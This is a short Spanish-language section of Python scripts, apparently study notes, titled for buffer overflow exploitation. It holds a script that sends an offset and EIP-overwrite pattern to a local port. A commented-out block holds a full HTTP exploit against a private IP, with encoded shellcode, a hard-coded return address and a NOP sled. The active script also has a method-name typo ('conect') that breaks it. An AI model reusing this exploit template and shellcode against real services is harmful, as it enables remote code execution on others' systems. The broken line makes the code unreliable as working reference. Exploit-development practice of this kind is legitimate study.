## Scripts en python

### Buffer Overflow

<pre>
#!/usr/bin/python3

import socket,  signal, sys

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(0)

# Ctlr+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
ip_address = "127.0.0.1"
offset = 1052
before_eip = b"A"*offset
eip = b"B"*4
after_eip=b"C"*100

payload = before_eip + eip + after_eip

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.conect((ip_address, 8888))
    s.send(payload)


if __name__ == '__main__':

    makeConnection()

#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.connect(('192.168.3.103',80))
#metodo_http = "GET "
#buf =  ""
#buf += "\xbe\x13\xd8\xc8\xbe\xd9\xc4\xd9\x74\x24\xf4\x5a\x29"
#buf += "\xc9\xb1\x52\x83\xc2\x04\x31\x72\x0e\x03\x61\xd6\x2a"
#buf += "\x4b\x79\x0e\x28\xb4\x81\xcf\x4d\x3c\x64\xfe\x4d\x5a"
#buf += "\xed\x51\x7e\x28\xa3\x5d\xf5\x7c\x57\xd5\x7b\xa9\x58"
#buf += "\x5e\x31\x8f\x57\x5f\x6a\xf3\xf6\xe3\x71\x20\xd8\xda"
#buf += "\xb9\x35\x19\x1a\xa7\xb4\x4b\xf3\xa3\x6b\x7b\x70\xf9"
#buf += "\xb7\xf0\xca\xef\xbf\xe5\x9b\x0e\x91\xb8\x90\x48\x31"
#buf += "\x3b\x74\xe1\x78\x23\x99\xcc\x33\xd8\x69\xba\xc5\x08"
#buf += "\xa0\x43\x69\x75\x0c\xb6\x73\xb2\xab\x29\x06\xca\xcf"
#buf += "\xd4\x11\x09\xad\x02\x97\x89\x15\xc0\x0f\x75\xa7\x05"
#buf += "\xc9\xfe\xab\xe2\x9d\x58\xa8\xf5\x72\xd3\xd4\x7e\x75"
#buf += "\x33\x5d\xc4\x52\x97\x05\x9e\xfb\x8e\xe3\x71\x03\xd0"
#buf += "\x4b\x2d\xa1\x9b\x66\x3a\xd8\xc6\xee\x8f\xd1\xf8\xee"
#buf += "\x87\x62\x8b\xdc\x08\xd9\x03\x6d\xc0\xc7\xd4\x92\xfb"
#buf += "\xb0\x4a\x6d\x04\xc1\x43\xaa\x50\x91\xfb\x1b\xd9\x7a"
#buf += "\xfb\xa4\x0c\x2c\xab\x0a\xff\x8d\x1b\xeb\xaf\x65\x71"
#buf += "\xe4\x90\x96\x7a\x2e\xb9\x3d\x81\xb9\x06\x69\x8a\x8b"
#buf += "\xef\x68\x8c\xfa\xb3\xe5\x6a\x96\x5b\xa0\x25\x0f\xc5"
#buf += "\xe9\xbd\xae\x0a\x24\xb8\xf1\x81\xcb\x3d\xbf\x61\xa1"
#buf += "\x2d\x28\x82\xfc\x0f\xff\x9d\x2a\x27\x63\x0f\xb1\xb7"
#buf += "\xea\x2c\x6e\xe0\xbb\x83\x67\x64\x56\xbd\xd1\x9a\xab"
#buf += "\x5b\x19\x1e\x70\x98\xa4\x9f\xf5\xa4\x82\x8f\xc3\x25"
#buf += "\x8f\xfb\x9b\x73\x59\x55\x5a\x2a\x2b\x0f\x34\x81\xe5"
#buf += "\xc7\xc1\xe9\x35\x91\xcd\x27\xc0\x7d\x7f\x9e\x95\x82"
#buf += "\xb0\x76\x12\xfb\xac\xe6\xdd\xd6\x74\x16\x94\x7a\xdc"
#buf += "\xbf\x71\xef\x5c\xa2\x81\xda\xa3\xdb\x01\xee\x5b\x18"
#buf += "\x19\x9b\x5e\x64\x9d\x70\x13\xf5\x48\x76\x80\xf6\x58"
#buff = "A"*1787 + "\x5f\xa5\xa7\x7c" + "\x90"*20 + buf
#cabecera_http=" HTTP/1.1\r\n\r\n"
#buff_final = metodo_http+buff+cabecera_http
#sock.send(buff_final)
#sock.recv(1024)
#sock.close()
</pre>
